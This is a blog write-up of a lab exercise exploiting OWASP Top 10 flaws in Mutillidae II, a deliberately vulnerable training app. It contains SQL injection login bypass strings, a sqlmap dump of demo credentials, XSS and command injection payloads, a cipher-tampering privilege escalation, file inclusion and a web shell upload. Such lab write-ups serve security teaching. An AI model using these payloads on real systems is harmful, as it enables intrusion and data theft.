+++
categories = ["web"]
description = ""
keywords = [""]
date = "2015-02-03T10:48:16Z"
title = "OWASP Top 10 in Mutillidae (Part1)"

+++

## Intro

*OWASP Mutillidae II* is a free, open source, deliberately vulnerable web-application providing a target for web-security enthusiast. It features many vulnerabilities and challenges. 
Contains at least one vulnerability for each of the *OWASP Top Ten*.

<!--more-->

For this writeup Mutillidae version 2.6.17 inside XAMPP (Windows 7) was used (*Security Level: 0*).

The OWASP Top 10 - 2013 is as follows:

* [A1 Injection](#a1) 
* [A2 Broken Authentication and Session Management](#a2)
* [A3 Cross-Site Scripting (XSS)](#a3)
* [A4 Insecure Direct Object References](#a4)
* [A5 Security Misconfiguration](#a5)
* *A6 Sensitive Data Exposure*
* *A7 Missing Function Level Access Control*
* *A8 Cross-Site Request Forgery (CSRF)*
* *A9 Using Components with Known Vulnerabilities*
* *A10 Unvalidated Redirects and Forwards*

## <a name="a1"></a> A1 Injection

Injection flaws, such as SQL, OS, and LDAP injection occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization. 

### SQL Injections

The first SQL injection is in the login page. If we input single quote as password and try to login, the app conveniently shows us the SQL query (in the error message):

`SELECT * FROM accounts WHERE username='' AND password='''`

We can see that both username and password fields should be injectable. We can use that information to login as any user. 
Using username **`admin'-- -`** and any password or username **`admin`** and password **`' or 1=1-- -`** we can login as admin.

![admin](/images/2015/02/03/admin.png)

There's another SQL injection in the `view-someones-blog.php` page. Let's use `burp` and `sqlmap` to automate the exploitation. First we intercept the HTTP request with burp and save it to a file:

![request](/images/2015/02/03/request.png)
  
Then we can use the request file with sqlmap and extract data from the database(s):

```
sqlmap -r ~/request --dbs
[05:56:08] [INFO] the back-end DBMS is MySQL
web server operating system: Windows
web application technology: PHP 5.6.3, Apache 2.4.10
back-end DBMS: MySQL 5.0
[05:56:08] [INFO] fetching database names
available databases [8]:
[*] cdcol
[*] information_schema
[*] mysql
[*] nowasp
[*] performance_schema
[*] phpmyadmin
[*] test
[*] webauth
```

We can dump user account data:

```
Database: nowasp
Table: accounts
[23 entries]
+-----+----------+---------------+----------+--------------+-----------+-----------------------------------------+
| cid | username | lastname      | is_admin | password     | firstname | mysignature                             |
+-----+----------+---------------+----------+--------------+-----------+-----------------------------------------+
| 9   | simba    | Lion          | FALSE    | password     | Simba     | I am a super-cat                        |
| 8   | bobby    | Hill          | FALSE    | password     | Bobby     | Hank is my dad                          |
| 7   | jim      | Rome          | FALSE    | password     | Jim       | Rome is burning                         |
| 6   | samurai  | WTF           | FALSE    | samurai      | Samurai   | Carving fools                           |
| 5   | bryce    | Galbraith     | FALSE    | password     | Bryce     | I Love SANS                             |
| 4   | jeremy   | Druin         | FALSE    | password     | Jeremy    | d1373 1337 speak                        |
| 3   | john     | Pentest       | FALSE    | monkey       | John      | I like the smell of confunk             |
| 2   | adrian   | Crenshaw      | TRUE     | somepassword | Adrian    | Zombie Films Rock!                      |
| 23  | ed       | Skoudis       | FALSE    | pentest      | Ed        | Commandline KungFu anyone?              |
| 22  | james    | Jardine       | FALSE    | i<3devs      | James     | Occupation: Researcher                  |
| 21  | CHook    | Hook          | FALSE    | JollyRoger   | Captain   | Gator-hater                             |
| 20  | PPan     | Pan           | FALSE    | NotTelling   | Peter     | Where is Tinker?                        |
| 1   | admin    | Administrator | TRUE     | adminpass    | System    | g0t r00t?                               |
| 19  | ABaker   | Baker         | TRUE     | SoSecret     | Aaron     | Muffin tops only                        |
| 18  | tim      | Tomes         | FALSE    | lanmaster53  | Tim       | Because reconnaissance is hard to spell |
| 17  | rocky    | Paws          | FALSE    | stripes      | Rocky     | treats?                                 |
| 16  | patches  | Pester        | FALSE    | tortoise     | Patches   | meow                                    |
| 15  | dave     | Kennedy       | FALSE    | set          | Dave      | Bet on S.E.T. FTW                       |
| 14  | kevin    | Johnson       | FALSE    | 42           | Kevin     | Doug Adams rocks                        |
| 13  | john     | Wall          | FALSE    | password     | John      | Do the Duggie!                          |
| 12  | cal      | Calipari      | FALSE    | password     | John      | C-A-T-S Cats Cats Cats                  |
| 11  | scotty   | Evil          | FALSE    | password     | Scotty    | Scotty do                               |
| 10  | dreveil  | Evil          | FALSE    | password     | Dr.       | Preparation H                           |
+-----+----------+---------------+----------+--------------+-----------+-----------------------------------------+
```

### Other Injections

#### HTML/Javascript Injection

These injections occur when user input ends up in a generated web page and is treated as code rather than text. 
In the `browser-info.php` page we can see information about our browser, such as User-Agent, Referrer, cookie information, etc.
If we modify User-Agent string (via browser add-ons or burp) to be:

`<script>alert('User Agent injection!')</script>`

We can see that it becomes part of the page code:

![User-Agent](/images/2015/02/03/ua.png)

It is actually displayed two times, because it is included in two different places within the page.

#### Command Injection

![DNS](/images/2015/02/03/dns.png)

In this page the user input is intended to a shell command's argument. 
However, most shells support stacked commands and if user input is not sanitized, we can execute additional commands in the context of the web server. 

In Linux we can add additional commands with `;` and in Windows with `&` or `&&`.
Adding `& dir` will result in:

![dir](/images/2015/02/03/dir.png)

<!--
#### XML Injection
-->

## <a name="a2"></a> A2 Broken Authentication and Session Management

Application functions related to authentication and session management are often not implemented correctly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities. 

Mutillidae has a page called "View User Privilege Level" where an attacker can escalate to root privileges by attacking a weak encryption mechanism. 

![priv](/images/2015/02/03/priv.png)

This page has a default http parameter `iv=6bc24fc1ab650b25b4114e93a98f1eba` which somehow encodes the 3 ids shown in the picture.
By changing various bytes in the *iv* parameter we can change the values displayed on the page. After a few tries we can see that **5th** and **8th** byte directly correspond to the first chars of *UID* and *GID*.
With the value 6bc24fc1***00***650b***00***b4114e93a98f1eba, 
we have *0x9a* and *0x14* as first *UID* and *GID* chars respectively. 

Normally we could use burp to brute force the values (256 + 256 tries), but here simple *XOR* is used, so we
can do it by hand. We are looking for values that *XOR* with *0x9a* and *0x14* and produce *0x30*. Since *XOR* is communicative, we can calculate:

	0x9A XOR 0x30 = 0xAA
	0x14 XOR 0x30 = 0x24

Using 6bc24fc1***aa***650b***24***b4114e93a98f1eba value we get:

![root](/images/2015/02/03/root.png)

## <a name="a3"></a> A3 Cross-Site Scripting (XSS)

XSS flaws occur whenever an application takes untrusted data and sends it to a web browser without proper validation or escaping. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.

XSS can be either *Reflected (First Order)* or *Persistent (Second Order)*. Reflected XSS requires a victim to visit maliciously crafted URL, while the more dangerous persistent XSS gets stored on the server and is executed each time the vulnerable page is loaded. On the `add-to-your-blog.php` page a user can create a new blog post. This page contains a persistent XSS vulnerability. If we create a blog post with this code:

`<script>alert("Malicious blog post!")</script>`

Then upon viewing the blog post the victim's browser will execute the malicious code: 

![xss](/images/2015/02/03/xss.png)

## <a name="a4"></a> A4 Insecure Direct Object References

A direct object reference occurs when a developer exposes a reference to an internal implementation object, such as a file, directory, or database key. Without an access control check or other protection, attackers can manipulate these references to access unauthorized data.

Mutillidae contains a few *Local File Inclusion (LFI)* vulnerabilities. One is in the `arbitrary-file-inclusion.php` page. 

`http://192.168.1.66/mutillidae/index.php?page=arbitrary-file-inclusion.php`

Here any file specified in the *page* variable gets included in the current page. This allows attacker to execute any php file present on the web server or view contents of sensitive non php files (logs, configuration, etc.).
In some cases this vulnerability allows to include remote php files (*Remote File Inclusion*), however, newer PHP configurations disable this by default. 

Another vulnerable page is `text-file-viewer.php`. This page allows us to view text files from a remote server, by selecting them from a drop-down list. 
However, if intercept the request with burp and change `textfile` variable, we can view the source code of any
web server files. We can view the source code of the current page:

```php
try {
	switch ($_SESSION["security-level"]){
		case "0": // This code is insecure
		case "1": // This code is insecure
			$lUseTokenization = FALSE;
			$lEncodeOutput = FALSE;
			$lProtectAgainstMethodTampering = FALSE;
		break;
    		
		case "2":
		case "3":
		case "4":
   		case "5": // This code is fairly secure
			$lUseTokenization = TRUE;
			$lEncodeOutput = TRUE;
			$lProtectAgainstMethodTampering = TRUE;
		break;
   	}// end switch ($_SESSION["security-level"])
}catch(Exception $e){
	echo $CustomErrorHandler->FormatError($e, "Error in text file viewer. Cannot load file.");
}// end try
```


## <a name="a5"></a> A5 Security Misconfiguration

Good security requires having a secure configuration defined and deployed for the application, frameworks, application server, web server, database server, and platform. Secure settings should be defined, implemented, and maintained, as defaults are often insecure. Additionally, software should be kept up to date.

Most common security misconfiguration is relying on "hidden" directories and files. The only security here being the assumption that the attacker will not find out the names of such resources, because they have no links to them
from the main pages. However, these names can be guessed or brute forced. We have a few of them in our web server. World accessible `passwords` folder:

![pass](/images/2015/02/03/pass.png)

Or `data` folder:

![data](/images/2015/02/03/data.png)

Another common misconfiguration is unrestricted file upload. Most of the time files containing executable code (php, asp, js, etc.) are not allowed. However, if restrictions are implemented badly or not present at all, then attacker 
can execute code on the server via file upload:

![upload](/images/2015/02/03/upload.png)

After uploading the shell, we can browse to it and execute commands on the server:

`http://192.168.1.66/mutillidae/upload/shell.php?cmd=dir`

```
Volume in drive C has no label. Volume Serial Number is E2B8-4C80 Directory of C:\xampp\htdocs\mutillidae\upload 02/05/2015 11:24 AM
. 02/05/2015 11:24 AM
.. 02/05/2015 11:05 AM 132 shell.php 1 File(s) 132 bytes 2 Dir(s) 12,596,895,744 bytes free dir
```

### To be continued...

<!--

## A6 Sensitive Data Exposure

Many web applications do not properly protect sensitive data, such as credit cards, tax IDs, and authentication credentials. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data deserves extra protection such as encryption at rest or in transit, as well as special precautions when exchanged with the browser. 

## A7 Missing Function Level Access Control

Most web applications verify function level access rights before making that functionality visible in the UI. However, applications need to perform the same access control checks on the server when each function is accessed. If requests are not verified, attackers will be able to forge requests in order to access functionality without proper authorization. 

## A8 Cross-Site Request Forgery (CSRF)

A CSRF attack forces a logged-on victim’s browser to send a forged HTTP request, including the victim’s session cookie and any other automatically included authentication information, to a vulnerable web application. This allows the attacker to force the victim’s browser to generate requests the vulnerable application thinks are legitimate requests from the victim. 

## A9 Using Components with Known Vulnerabilities

Components, such as libraries, frameworks, and other software modules, almost always run with full privileges. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications using components with known vulnerabilities may undermine application defenses and enable a range of possible attacks and impacts. 

## A10 Unvalidated Redirects and Forwards

Web applications frequently redirect and forward users to other pages and websites, and use untrusted data to determine the destination pages. Without proper validation, attackers can redirect victims to phishing or malware sites, or use forwards to access unauthorized pages. 
-->
